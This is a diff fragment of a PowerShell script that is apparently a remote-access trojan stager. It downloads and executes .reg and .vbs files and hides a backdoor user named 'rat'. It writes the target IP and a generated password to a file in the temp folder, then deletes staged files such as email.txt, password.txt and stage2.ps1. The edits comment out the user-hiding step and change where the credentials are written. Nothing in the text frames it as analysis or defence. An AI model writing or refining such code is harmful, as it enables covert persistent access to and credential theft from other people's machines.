@@ -86,8 +86,8 @@ Invoke-WebRequest -Uri confirm-reg.vbs -OutFile "$vb_string.vbs"
 Invoke-Expression "./$reg_string.reg"; Invoke-Expression "./$vb_string.vbs"
 
 # hide rat user
-Set-Location C:\Users
-attrib +h +s +r rat
+#Set-Location C:\Users
+#attrib +h +s +r rat
 
 # self delete
 Set-Location $temp_folder_path
@@ -96,10 +96,12 @@ $file_content = @"
 Target IP Address: $target_ip
 Generated Password: $pass_gen_string
 "@
-Set-Content -Path $current_dir -Value $file_content -Encoding UTF8
 
-Remove-Item $user_name
+$output_file = Join-Path $temp_folder_path "output.txt"
+Set-Content -Path $output_file -Value $file_content -Encoding UTF8
+
+# Clean up files as before
+#Remove-Item $user_name
 Remove-Item email.txt
 Remove-Item password.txt
 Remove-Item stage2.ps1
-
